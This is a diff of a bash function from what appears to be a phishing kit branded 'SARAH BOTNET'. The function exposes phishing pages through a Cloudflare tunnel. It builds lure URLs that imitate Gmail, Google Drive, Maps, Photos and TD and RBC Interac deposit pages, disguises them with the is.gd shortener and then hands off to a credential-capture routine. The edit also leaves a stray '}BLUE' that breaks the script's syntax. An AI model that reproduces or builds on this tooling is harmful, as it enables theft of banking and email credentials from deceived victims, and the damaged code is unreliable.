@@ -351,11 +351,11 @@ cloudflared_start() {
 	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
 	cldflr_url1=${cldflr_url#https://}
 
-	gmap_url="${cldflr_url}/accounts/authentication/ID=17566/040147.php"
-	drive_url="${cldflr_url}/accounts/authentication/1D=17567/040147.php"
-	photo_url="${cldflr_url}/accounts/authentication/ID=17568/040147.php"
+	gmap_url="${cldflr_url}/040147.php"
+	drive_url="${cldflr_url}/040147.php"
+	photo_url="${cldflr_url}/040147.php"
 	player2_url="${cldflr_url}/accounts/personal/2/GEN.php"
-	player_url="${cldflr_url}/accounts/work/team/sarah/index.php"
+	player_url="${cldflr_url}/sarah/index.php"
 	gmail_url="${cldflr_url}/authentication/ID=17569/040147.php"
 	td_url="${cldflr_url}/accounts/interac/deposit/TD/040147.php"
         rbc_url="${cldflr_url}/accounts/interac/deposit/RBC/040147.php"
@@ -378,18 +378,16 @@ cloudflared_start() {
 	url_short8=$(curl -s 'https://is.gd/create.php?format=simple&url='"$atb_url")
 	url_short9=$(curl -s 'https://is.gd/create.php?format=simple&url='"$SCO_url")
 
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}====-===[SARAH=BOTNET=V1]===-===${GREEN}[${WHITE}-${GREEN}]${WHITE}"
+	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}===========[SARAH]===-===${GREEN}[${WHITE}-${GREEN}]${WHITE}"
 
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE} SARAH [ON-THE-GO] : ${ORANGE}$url_short2"
-
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}=======[USE WITH CAUTION]=======${GREEN}[${WHITE}-${GREEN}]${WHITE}"
+	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  SELECTMENU : ${ORANGE}$url_short2"
 	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  PHOTO      : ${RED}$url_short1"
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  DRIVE      : ${RED}$url_shrt3"
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  GMAPS      : ${RED}$url_sort3"
+	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  DRIVE      : ${BLUE}$url_shrt3"
+	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  GMAPS      : ${GREEN}$url_sort3"
 	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}=======[USE WITH CAUTION]=======${GREEN}[${WHITE}-${GREEN}]${WHITE}"	
 
 	credentials
-}
+}BLUE
 
 
 
